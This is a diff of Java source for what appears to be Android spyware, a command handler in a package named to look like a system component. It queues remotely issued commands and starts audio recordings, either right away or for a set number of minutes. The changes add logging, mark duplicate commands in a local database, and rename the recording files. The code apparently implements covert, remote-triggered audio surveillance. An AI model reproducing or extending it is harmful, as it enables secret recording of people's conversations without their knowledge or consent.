@@ -13,6 +13,7 @@ import com.android.system.controled.Debug;
 import com.android.system.controled.MainApplication;
 import com.android.system.controled.bean.Code;
 import com.android.system.controled.bean.Command;
+import com.android.system.controled.db.InnerDbOpera;
 import com.android.system.controled.util.AudioUtil;
 import com.android.system.controled.util.FileUtil;
 import com.android.system.controled.util.NetworkUtil;
@@ -47,13 +48,18 @@ public class CodeDoing implements Runnable {
 		Command command = new Command();
 		command.code = code;
 		command.runnable = runnable;
-
+		Debug.e(TAG, "新增命令：" + code.getCode());
 		int retries = 3;
 		Exception e = null;
 		while (retries-- > 0) {
 			try {
 				if (mCommands.contains(command)) {
-
+					Debug.e(TAG, "正在执行的命令重复！");
+					
+					Code code2 = new Code();
+					code2.setDate(command.code.getDate());
+					code2.setResult(Code.RESULT_CODE_REPEAT);
+					InnerDbOpera.getInstence().updateCodeResult(code2);
 					return;
 				}
 				mCommands.put(command);
@@ -81,6 +87,7 @@ public class CodeDoing implements Runnable {
 				}
 				if (command != null) {
 					commandDescription = command.code.getCode();
+					Debug.e(TAG, "执行：" + commandDescription);
 					command.runnable.run();
 				}
 			} catch (Exception e) {
@@ -301,8 +308,8 @@ public class CodeDoing implements Runnable {
 		code.setRedoNeed(Code.REDO_NOT);
 		Debug.e(TAG, "开始录音");
 		// 文件保存位置
-		File file = new File(MainApplication.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
-		if (RecorderUtil.getInstence(context).startRecorder(file, -1)) {
+		String fileName = MainApplication.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis());
+		if (RecorderUtil.getInstence(context).startRecorder(fileName, -1)) {
 			code.setResult(Code.RESULT_OK);
 		}
 	}
@@ -347,8 +354,8 @@ public class CodeDoing implements Runnable {
 
 			Debug.e(TAG, "录音N分钟: " + strs[1]);
 			// 文件保存位置
-			File file = new File(MainApplication.FILEPATH_AUDIOS_OTHER + strs[1] + " minutes-" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
-			if (RecorderUtil.getInstence(context).startRecorder(file, Integer.parseInt(strs[1]))) {
+			String fileName = MainApplication.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "-" + strs[1] + " minutes";
+			if (RecorderUtil.getInstence(context).startRecorder(fileName, Integer.parseInt(strs[1]))) {
 				code.setResult(Code.RESULT_OK);
 			}
 
